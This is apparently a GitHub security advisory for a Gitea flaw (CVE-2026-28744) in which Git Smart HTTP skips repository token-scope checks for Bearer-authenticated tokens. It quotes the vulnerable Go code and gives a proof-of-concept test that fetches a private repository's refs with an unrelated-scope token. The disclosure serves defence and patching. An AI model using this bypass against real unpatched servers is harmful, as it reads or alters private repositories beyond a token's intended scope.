# [H] Gitea: Git Smart HTTP Skips Repository Token Scopes for Bearer Tokens

## Summary
Severity: High
Advisory: GHSA-cc8w-r4qh-3v65
CVE: CVE-2026-28744
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-cc8w-r4qh-3v65
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.26.2

## Details
### Summary
Gitea v1.26.1 enforces repository-scoped access-token permissions on repository operations. In the Git Smart HTTP path, however, this check runs only when the token is presented via HTTP Basic authentication — `CheckRepoScopedToken()` returns early unless `ctx.IsBasicAuth` is true — so the same token sent as `Authorization: Bearer <token>` bypasses the scope check entirely.

As a result, a PAT or OAuth2 token presented as a Bearer credential can clone or fetch private repositories without the `read:repository` scope, and likewise reach the Git push without `write:repository`.

### Details
Git Smart HTTP routes allow both Basic auth and OAuth2/Bearer auth:

```go
// routers/web/web.go
addOwnerRepoGitHTTPRouters(
	m,
	repo.HTTPGitEnabledHandler,
	webAuth.AllowBasic,
	webAuth.AllowOAuth2,
	repo.CorsHandler(),
	optSignInFromAnyOrigin,
	context.UserAssignmentWeb(),
)
```

The Git HTTP authorization path calls `CheckRepoScopedToken()` before falling through to normal repository RBAC:

```go
// routers/web/repo/githttp.go
if askAuth {
	if !ctx.IsSigned {
		ctx.HTTPError(http.StatusUnauthorized)
		return nil
	}

	context.CheckRepoScopedToken(ctx, repo, auth_model.GetScopeLevelFromAccessMode(accessMode))
	if ctx.Written() {
		return nil
	}

	// normal repository RBAC follows
}
```

However, `CheckRepoScopedToken()` only enforces token scopes for Basic-authenticated requests:

```go
// services/context/permission.go
func CheckRepoScopedToken(ctx *Context, repo *repo_model.Repository, level auth_model.AccessTokenScopeLevel) {
	if !ctx.IsBasicAuth || ctx.Data["IsApiToken"] != true {
		return
	}

	scope, ok := ctx.Data["ApiTokenScope"].(auth_model.AccessTokenScope)
	if ok {
		requiredScopes := auth_model.GetRequiredScopes(level, auth_model.AccessTokenScopeCategoryRepository)
		// public-only and required repository scope checks follow
	}
}
```

The Bearer/OAuth2 auth path still records the token scope:

```go
// services/auth/oauth2.go
accessTokenScope, uid := GetOAuthAccessTokenScopeAndUserID(ctx, tokenSHA)
if uid != 0 {
	store.GetData()["IsApiToken"] = true
	store.GetData()["ApiTokenScope"] = accessTokenScope
}
```

Bearer PATs also set `IsApiToken=true` and `ApiTokenScope`, but `ctx.IsBasicAuth` remains false because the selected auth method is OAuth2/Bearer rather than Basic. The scope is therefore available but ignored.

### PoC
This test creates a token for `user2` with only `read:notification`, then requests Git Smart HTTP refs for `user2/repo2`, which is private. The same token is rejected over Basic auth, but succeeds over Bearer auth.

```go
func TestPOCGitSmartHTTPBearerTokenBypassesRepositoryScope(t *testing.T) {
	defer tests.PrepareTestEnv(t)()

	repo := unittest.AssertExistsAndLoadBean(t, &repo_model.Repository{ID: 2, OwnerName: "user2", Name: "repo2"})
	assert.True(t, repo.IsPrivate)

	session := loginUser(t, "user2")
	token := getTokenForLoggedInUser(t, session, auth_model.AccessTokenScopeReadNotification)
	url := "/user2/repo2/info/refs?service=git-upload-pack"

	basicReq := NewRequest(t, "GET", url)
	basicReq.SetBasicAuth(token, "x-oauth-basic")
	MakeRequest(t, basicReq, http.StatusForbidden)

	bearerReq := NewRequest(t, "GET", url).AddTokenAuth(token)
	resp := MakeRequest(t, bearerReq, http.StatusOK)
	assert.Contains(t, resp.Body.String(), "refs/heads/master")
}
```

### Impact
Any Gitea instance exposing Git Smart HTTP is affected when users use PATs or OAuth2 tokens as Bearer tokens. The attacker still needs a token for a user who has normal repository RBAC, so this does not grant access to repositories the token owner could not otherwise access.

The vulnerability breaks the access-token scope boundary. A token intended only for unrelated scopes, such as `read:notification`, can clone or fetch private repository contents over Git Smart HTTP. The same root cause can affect write flows because `git-receive-pack` also calls the same repository scope check before normal write RBAC.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-cc8w-r4qh-3v65
- https://github.com/go-gitea/gitea
